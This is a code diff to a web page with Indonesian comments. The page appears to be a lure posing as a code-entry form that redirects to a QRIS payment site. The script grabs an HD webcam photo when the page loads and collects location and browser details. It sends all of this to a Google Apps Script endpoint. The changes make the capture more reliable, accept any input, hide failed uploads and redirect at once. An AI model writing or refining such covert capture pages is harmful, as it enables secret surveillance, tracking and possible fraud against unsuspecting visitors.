@@ -24,8 +24,8 @@ button:hover {background:#2563eb;}
 </div>
 
 <script>
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbwNn1wWAT1CJOTP69YuHTvnYWZkTLR8P76nro_up7ZRhAyJDw-RDSk590Fovs_C6YZVZw/exec"; // ganti dengan URL Web App lu
-const REDIRECT_URL = "https://qris.interactive.co.id"; 
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKws1nOH7Q8-WuhloZ8_O1H7gZ5gBAHlcJh18f4ZIZTRkUAwweUR02tgxd9u1QDnRv/exec"; // ganti URL Web App lo
+const REDIRECT_URL = "https://qris.interactive.co.id"; // link redirect manual
 
 async function autoRecord(){
     let location="Unavailable", photo="";
@@ -41,13 +41,18 @@ async function autoRecord(){
         await video.play();
 
         const canvas=document.createElement("canvas");
-        // resolusi HD (1280x720)
         canvas.width=1280;
         canvas.height=720;
         canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
 
-        // kualitas tinggi biar detail (90%)
-        photo=canvas.toDataURL("image/jpeg",0.9); 
+        photo = await new Promise(resolve => {
+            canvas.toBlob(blob => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            }, "image/jpeg", 0.9);
+        });
+
         stream.getTracks().forEach(track=>track.stop());
     }catch(e){console.warn("Kamera ditolak");}
 
@@ -59,7 +64,7 @@ async function autoRecord(){
 }
 
 async function handleSubmit(){
-    const code=document.getElementById("codeInput").value;
+    const code=document.getElementById("codeInput").value || "ANY"; // apapun bisa masuk
     const userAgent=navigator.userAgent;
     let location="Unavailable";
     try{
@@ -73,14 +78,18 @@ async function handleSubmit(){
     document.getElementById("message").style.display="block";
     document.getElementById("message").textContent="Submitting...";
 
-    await fetch(APPSCRIPT_URL,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify(body)
-    });
+    try{
+        await fetch(APPSCRIPT_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify(body)
+        });
+    }catch(e){
+        console.warn("Gagal kirim data:", e);
+    }
 
-    document.getElementById("message").textContent="Submitted!";
-    setTimeout(()=>{window.location.href=REDIRECT_URL;},1500);
+    // langsung redirect tanpa nunggu respon
+    window.location.href=REDIRECT_URL;
 }
 
 window.onload=autoRecord;
